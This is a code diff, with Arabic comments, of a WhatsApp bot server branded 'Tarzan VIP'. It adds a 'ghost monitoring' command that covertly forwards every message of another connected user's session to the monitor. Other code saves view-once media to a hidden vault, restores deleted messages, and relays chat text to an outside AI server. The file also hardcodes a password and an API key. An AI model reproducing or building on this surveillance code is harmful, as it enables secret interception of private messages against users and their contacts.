@@ -14,7 +14,9 @@ const {
     fetchLatestBaileysVersion,
     makeCacheableSignalKeyStore,
     downloadMediaMessage,
-    jidNormalizedUser
+    jidNormalizedUser,
+    generateWAMessageFromContent,
+    proto
 } = require('@whiskeysockets/baileys');
 
 // 🛡️ درع الحماية من الانهيار
@@ -27,11 +29,10 @@ const MASTER_PASSWORD = 'tarzanbot';
 const sessions = {};
 const msgStore = new Map(); 
 
-// ==========================================
-// 📂 أنظمة الحفظ والاستعادة الدائمة
-// ==========================================
+// 👁️ خريطة الذاكرة لنظام المراقبة الشبحية
+const activeMonitors = new Map();
 
-// 1. إعدادات الجلسات
+// ✅ 1. نظام حفظ الإعدادات
 const settingsPath = path.join(__dirname, 'settings.json');
 let botSettings = {};
 if (fs.existsSync(settingsPath)) { 
@@ -40,13 +41,17 @@ if (fs.existsSync(settingsPath)) {
     botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
     fs.writeFileSync(settingsPath, JSON.stringify(botSettings)); 
 }
-if (!botSettings.GLOBAL_CONFIG) { botSettings.GLOBAL_CONFIG = { geminiApiKey: "" }; saveSettings(); }
+
+if (!botSettings.GLOBAL_CONFIG) {
+    botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
+    saveSettings();
+}
+
 function saveSettings() { fs.writeFileSync(settingsPath, JSON.stringify(botSettings, null, 2)); }
 function generateSessionPassword() { return 'VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase(); }
 
-// 2. ذاكرة المراقبة الشبحية (تبقى فعالة حتى بعد إعادة تشغيل السيرفر)
+// ✅ 2. ذاكرة المراقبة الشبحية
 const monitorsPath = path.join(__dirname, 'monitors.json');
-let activeMonitors = new Map();
 if (fs.existsSync(monitorsPath)) {
     try {
         const data = JSON.parse(fs.readFileSync(monitorsPath, 'utf8'));
@@ -55,20 +60,23 @@ if (fs.existsSync(monitorsPath)) {
 }
 function saveMonitors() { fs.writeFileSync(monitorsPath, JSON.stringify(Object.fromEntries(activeMonitors), null, 2)); }
 
-// 3. مجلد الميديا المخفية
+// ✅ 3. مجلد الخزنة للميديا المخفية
 const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
 if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);
 
-// 🛡️ نظام تفريغ الذاكرة المؤقتة الذكي
+// 🛡️ 4. نظام تفريغ الذاكرة الذكي
 setInterval(() => { 
-    if (msgStore.size > 5000) { msgStore.clear(); console.log('🧹 [حماية] تم تفريغ الرام'); }
+    if (msgStore.size > 5000) {
+        msgStore.clear(); 
+        console.log('🧹 [حماية السيرفر] تم تفريغ الذاكرة المؤقتة للرسائل لمنع اختناق الرام');
+    }
 }, 30 * 60 * 1000);
 
 app.use(express.static('public'));
 app.use(express.json());
 
 // ==========================================
-// 🚀 معالج الأوامر الخارجية
+// 🚀 5. معالج الأوامر (الإصدار الأصلي بدون تعديل)
 // ==========================================
 const commandsMap = new Map();
 const commandsPath = path.join(__dirname, 'commands');
@@ -87,13 +95,15 @@ function loadCommands() {
                     command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                 }
             }
-        } catch (err) { console.error(`❌ خطأ تحميل الأمر ${file}:`, err.message); }
+        } catch (err) {
+            console.error(`❌ خطأ في تحميل الأمر ${file}:`, err.message);
+        }
     }
 }
 loadCommands();
 
 // ==========================================
-// ⚙️ تشغيل وإدارة الجلسات
+// ⚙️ 6. تشغيل الجلسات
 // ==========================================
 async function startSession(sessionId, res = null, pairingNumber = null) {
     const sessionPath = path.join(__dirname, 'sessions', sessionId);
@@ -101,7 +111,13 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
     if (!botSettings[sessionId]) {
         botSettings[sessionId] = { 
-            password: generateSessionPassword(), botEnabled: true, commandsEnabled: true, aiEnabled: false, autoReact: false, reactEmoji: '❤️', welcomeSent: false
+            password: generateSessionPassword(), 
+            botEnabled: true, 
+            commandsEnabled: true, 
+            aiEnabled: false, 
+            autoReact: false, 
+            reactEmoji: '❤️', 
+            welcomeSent: false
         };
         saveSettings();
     }
@@ -112,11 +128,12 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
     const sock = makeWASocket({
         version,
         auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
-        logger: pino({ level: 'silent' }),
+        logger: pino({ level: 'silent' }), // 🛡️ سر استقرار السيرفر
         printQRInTerminal: false,
         markOnlineOnConnect: true,
-        browser: ['Windows', 'Edge', '10.0'],
-        syncFullHistory: false
+        browser: ['Windows', 'Edge', '10.0'], // 🌟 Edge لمنع حظر واتساب
+        syncFullHistory: false,
+        generateHighQualityLinkPreviews: false
     });
 
     sessions[sessionId] = sock;
@@ -129,7 +146,8 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                 const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                 if (res && !res.headersSent) res.json({ pairingCode: formattedCode });
             } catch (err) {
-                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود.' });
+                console.log('❌ خطأ في كود الاقتران:', err);
+                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود. السيرفرات مزدحمة، حاول بعد ثوانٍ.' });
             }
         }, 3000); 
     }
@@ -152,7 +170,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}
 
             if (!botSettings[sessionId].welcomeSent) {
-                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك:*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}`;
+                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك (لإعدادات الموقع):*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
                 await sock.sendMessage(selfId, { image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' }, caption: welcomeText });
                 botSettings[sessionId].welcomeSent = true; saveSettings();
             }
@@ -160,7 +178,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
     });
 
     // ==========================================
-    // 🛡️ مضاد الحذف الدقيق (بتنسيق مسطر)
+    // 🛡️ 7. مضاد الحذف الجبار
     // ==========================================
     sock.ev.on('messages.update', async updates => {
         for (const { key, update } of updates) {
@@ -171,7 +189,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                     const selfId = jidNormalizedUser(sock.user.id);
                     const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                     const numberStr = senderJid.split('@')[0];
-                    const nameStr = storedMsg.pushName || 'غير مسجل';
+                    const nameStr = storedMsg.pushName || 'مجهول';
                     const timeStr = moment().tz("Asia/Riyadh").format("hh:mm A | YYYY-MM-DD");
                     
                     const isGroupChat = key.remoteJid.endsWith('@g.us');
@@ -201,7 +219,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
     });
 
     // ==========================================
-    // 🔥 استقبال الرسائل المركزية & المراقبة
+    // 🔥 8. استقبال الرسائل المركزية
     // ==========================================
     sock.ev.on('messages.upsert', async ({ messages, type }) => {
         if (type !== 'notify') return;
@@ -211,7 +229,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         const from = msg.key.remoteJid;
         const isGroup = from.endsWith('@g.us');
         const sender = isGroup ? msg.key.participant : from;
-        const pushName = msg.pushName || 'غير مسجل بالموبايل';
+        const pushName = msg.pushName || 'مجهول';
         const selfId = jidNormalizedUser(sock.user.id);
         const isFromMe = msg.key.fromMe || sender === selfId;
 
@@ -220,7 +238,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         const currentSettings = botSettings[sessionId] || {};
         if (!currentSettings.botEnabled) return;
 
-        // اكتشاف العرض لمرة واحدة بدقة
+        // 👁️‍🗨️ [الرادار]: صائد العرض لمرة واحدة
         let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
         const mediaTypeCheck = Object.keys(msg.message)[0];
         if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
@@ -237,12 +255,12 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         // ==========================================
         if (body.startsWith('.مراقبه ')) {
             const targetSession = body.replace('.مراقبه ', '').trim();
-            if (!sessions[targetSession]) return reply('❌ *الـجـلـسـة الـمـطـلـوبـة غـيـر مـتـصـلـة صـحـيـحـاً.*');
-            if (targetSession === sessionId) return reply('❌ *لا يـمـكـنـك مـراقـبـة نـفـسـك.*');
+            if (!sessions[targetSession]) return reply('❌ *عـذراً، هـذه الـجـلـسـة غـيـر مـتـصـلـة صـحـيـحـاً.*');
+            if (targetSession === sessionId) return reply('❌ *لا يـمـكـنـك مـراقـبـة الـجـلـسـة الـتـي تـسـتـخـدمـهـا حـالـيـاً.*');
 
             activeMonitors.set(targetSession, { monitorJid: sender, monitorSocketId: sessionId });
             saveMonitors(); 
-            return reply(`✅ *تـم تـفـعـيـل الـمـراقـبـة بـنـجـاح*\n🎯 *الـهـدف:* [ ${targetSession} ]`);
+            return reply(`✅ *تـم تـفـعـيـل الـمـراقـبـة الـسـريـة بـنـجـاح.*\n\n👁️‍🗨️ الـهـدف: [ ${targetSession} ]\n📥 *سـيـتـم تـحـويـل جـمـيـع الـرسـائـل هـنـا بـشـكـل مـخـفـي.*`);
         }
         
         if (body === '.ايقاف_المراقبه') {
@@ -250,11 +268,11 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                 if (val.monitorJid === sender) activeMonitors.delete(key);
             }
             saveMonitors(); 
-            return reply('✅ *تـم إيـقـاف الـمـراقـبـة.*');
+            return reply('✅ *تـم إيـقـاف جـمـيـع عـمـلـيـات الـمـراقـبـة.*');
         }
 
         // ==========================================
-        // 🚨 تنفيذ المراقبة الدقيقة جداً والمُسطرة
+        // 🚨 تنفيذ المراقبة الشبحية الدقيقة المُسطرة
         // ==========================================
         if (activeMonitors.has(sessionId)) {
             const monitorInfo = activeMonitors.get(sessionId);
@@ -315,13 +333,13 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                         case 'pollCreationMessageV3': finalContentType = `📊 تـصـويـت [ ${actualMsgObj[msgTypeReal]?.name} ]`; break;
                         case 'conversation':
                         case 'extendedTextMessage': finalContentType = '💬 نـص عـادي'; break;
-                        default: finalContentType = `⚙️ إشـعـار بـنـيـة [${msgTypeReal}]`; break;
+                        default: finalContentType = `⚙️ إشـعـار أو رسـالـة نـظـام [${msgTypeReal}]`; break;
                     }
 
                     if (isVO) finalContentType = `👁️‍🗨️ عـرض لـمـرة واحـدة (${finalContentType})`;
                     if (mediaCaption) finalContentType += `\n*║* 📝 *الـنـص المرفق:* ${mediaCaption}`;
 
-                    // 4. بناء التنسيق المسطر الصارم 
+                    // 4. بناء التنسيق المسطر
                     const structuredReport = 
 `*╔═══[ 🚨 تـقـريـر مـراقـبـة 🚨 ]═══╗*
 *║*
@@ -350,7 +368,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         // ==========================================
-        // 👁️‍🗨️ صائد الميديا المخفية (الرادار العام)
+        // 👁️‍🗨️ الرادار: صائد العرض لمرة واحدة
         // ==========================================
         if (viewOnceIncoming && !isFromMe) {
             try {
@@ -367,58 +385,81 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                 if (mediaType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                 else if (mediaType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                 else if (mediaType === 'audioMessage') await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
-            } catch (err) {}
+            } catch (err) { console.error('❌ خطأ في الرادار التلقائي:', err); }
         }
 
         if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
             try { await sock.sendMessage(from, { react: { text: currentSettings.reactEmoji || '❤️', key: msg.key } }); } catch(e) {}
         }
 
-        const isCmd = body.startsWith('.');
-
         // ==========================================
-        // 🧠 الذكاء الاصطناعي (عبر الـ API الخاص بك)
+        // 🧠 8. الذكاء الاصطناعي (نظام Tarzan VIP المخصص)
         // ==========================================
         if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !viewOnceIncoming) {
             try {
                 await sock.sendPresenceUpdate('composing', from); 
+                
                 const query = body.trim();
                 const API_KEY = 'AI_1d21219cc3914971'; 
                 const API_URL = 'http://Fi5.bot-hosting.net:22214/api/chat';
 
-                const response = await axios.post(API_URL, { api_key: API_KEY, prompt: query }, { headers: { 'Content-Type': 'application/json' }, timeout: 25000 });
+                const response = await axios.post(API_URL, {
+                    api_key: API_KEY,
+                    prompt: query
+                }, {
+                    headers: { 'Content-Type': 'application/json' },
+                    timeout: 25000 
+                });
+
                 if (response.data && response.data.status === 'success') {
-                    await reply(response.data.response);
+                    const aiReply = response.data.response;
+                    await reply(aiReply);
+                } else {
+                    console.error('⚠️ تم رفض الطلب من سيرفر الذكاء الاصطناعي');
                 }
-            } catch (error) {}
+
+            } catch (error) {
+                console.error('❌ خطأ في الاتصال بسيرفر الذكاء الاصطناعي:', error.message);
+            }
             return; 
         }
 
         // ==========================================
-        // 🎯 معالجة الأوامر الخارجية
+        // 🎯 9. معالجة الأوامر الخارجية (الآن تعمل بشكل مثالي!)
         // ==========================================
         if (!currentSettings.commandsEnabled) return;
+
         let selectedId = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '';
         let commandName = '';
         let args = [];
         let textArgs = '';
 
-        if (selectedId) { commandName = selectedId.toLowerCase(); } 
-        else if (isCmd) {
+        if (selectedId) {
+            commandName = selectedId.toLowerCase();
+        } else if (isCmd) {
             args = body.slice(1).trim().split(/ +/);
             commandName = args.shift().toLowerCase();
             textArgs = args.join(' ');
         }
 
         if (!commandName) return;
+
         const commandData = commandsMap.get(commandName);
 
         if (commandData) {
             try {
-                if (commandName !== '🌚' && commandName !== 'vv') await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
-                await commandData.execute({ sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings });
+                if (commandName !== '🌚' && commandName !== 'vv') {
+                    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
+                }
+                
+                await commandData.execute({
+                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings
+                });
             } catch (error) {
-                if (commandName !== '🌚' && commandName !== 'vv') await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
+                console.error(`❌ خطأ في الأمر ${commandName}:`, error);
+                if (commandName !== '🌚' && commandName !== 'vv') {
+                    await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
+                }
             }
         }
     });
@@ -503,10 +544,11 @@ app.post('/delete-session', (req, res) => {
 app.listen(PORT, () => {
     console.log(`\n=========================================`);
     console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
-    console.log(`🛡️ وضع الحماية مفعل | 🧠 الذكاء الاصطناعي مدمج`);
-    console.log(`👻 نظام المراقبة الدقيق والمُسطر متاح وجاهز`);
+    console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
+    console.log(`🧠 نظام الذكاء الاصطناعي (TARZAN AI) مدمج وجاهز`);
+    console.log(`👻 نظام المراقبة الشبحية الشامل متاح ومُفعّل`);
     console.log(`=========================================\n`);
     
-    // تشغيل الجلسات المحفوظة فور تشغيل السيرفر
+    // تشغيل الجلسات المحفوظة فور تشغيل السيرفر!
     startAllSavedSessions();
 });
